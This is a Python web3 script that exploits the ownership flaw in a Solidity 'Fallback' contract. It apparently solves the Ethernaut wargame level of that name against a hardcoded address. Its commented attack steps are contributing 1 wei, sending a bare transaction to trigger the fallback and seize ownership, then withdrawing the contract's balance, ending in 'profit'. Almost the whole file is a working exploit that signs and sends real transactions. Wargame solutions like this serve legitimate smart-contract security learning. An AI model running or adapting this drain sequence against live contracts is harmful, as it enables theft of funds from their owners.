import web3
import solcx
from dotenv import load_dotenv
import os

load_dotenv()

# load variables from .env
wallet_private_key = os.getenv("WALLET_PRIVATE_KEY")
wallet_address = os.getenv("WALLET_ADDRESS")
w3 = web3.Web3(web3.HTTPProvider(os.getenv("WEB3_PROVIDER")))

contract_address = "0x03fDcC5354b76bdbbc5671b0a6fB3bc1725B6B2f"

# function to read contract source code, generate an abi, and create a contract object
def read_contract_return_abi(contract_file, contract_address, w3):
    with open(contract_file, "r") as f:
        contract_source = f.read()
        f.close()

    # install solc version 0.8.0 in case it's not installed.
    solcx.install_solc("0.8.0")
    solcx.set_solc_version("0.8.0")
    compiled_sol = solcx.compile_source(contract_source)

    # get abi from compiled_sol, <stdin> is the placeholder for the file name we chose.
    abi = compiled_sol["<stdin>:Fallback"]["abi"]

    contract = w3.eth.contract(address=contract_address, abi=abi)

    return contract

# function to send a transaction and return a receipt
def sign_and_send_transaction(w3, wallet_private_key, tx):
    signed_tx = w3.eth.account.sign_transaction(tx, wallet_private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

    return tx_receipt

def main():
    # attack steps:
    # 1. contribute 1 wei to the contract
    # 2. send a raw transaction with no calldata to the contract
    # 3. withdraw funds from the contract
    # 4. profit

    fallback = read_contract_return_abi("./fallback.sol", contract_address, w3)

    contribute_gas_estimate = fallback.functions.contribute().estimate_gas()

    contribute_tx_fields = {
        "value": 1,
        "gas": int(contribute_gas_estimate*2),
        "gasPrice": w3.to_wei("5", "gwei"),
        "nonce": w3.eth.get_transaction_count(wallet_address)
    }
    contribute_tx = fallback.functions.contribute().build_transaction(contribute_tx_fields)
    contribute_tx_receipt = sign_and_send_transaction(w3, wallet_private_key, contribute_tx)

    contribution = fallback .functions.contributions(wallet_address).call()

    if contribution > 0:
        print("Contributed successfully. Sending raw transaction...")
        print(f"Contribution: {contribution} wei")

        raw_tx_fields = {
            "to": contract_address,
            "value": 1, 
            "data": "0x",
            "gas": 40_000,
            "gasPrice": w3.to_wei("5", "gwei"), 
            "nonce": w3.eth.get_transaction_count(wallet_address)
        }

        raw_tx_receipt = sign_and_send_transaction(w3, wallet_private_key, raw_tx_fields)

        print("Attempting to withdraw funds...")

        withdrawal_tx_fields = {
            "gas": 50_000,
            "gasPrice": w3.to_wei("5", "gwei"),
            "nonce": w3.eth.get_transaction_count(wallet_address)
        }

        withdrawal_tx = fallback.functions.withdraw().build_transaction(withdrawal_tx_fields)
        withdrawal_tx_receipt = sign_and_send_transaction(w3, wallet_private_key, withdrawal_tx)
    
        if withdrawal_tx_receipt["status"] == 1:
            print("Withdrawal successful. Exiting...")
    else:
        print("Contribution failed. Exiting...")

if __name__ == "__main__":
    main()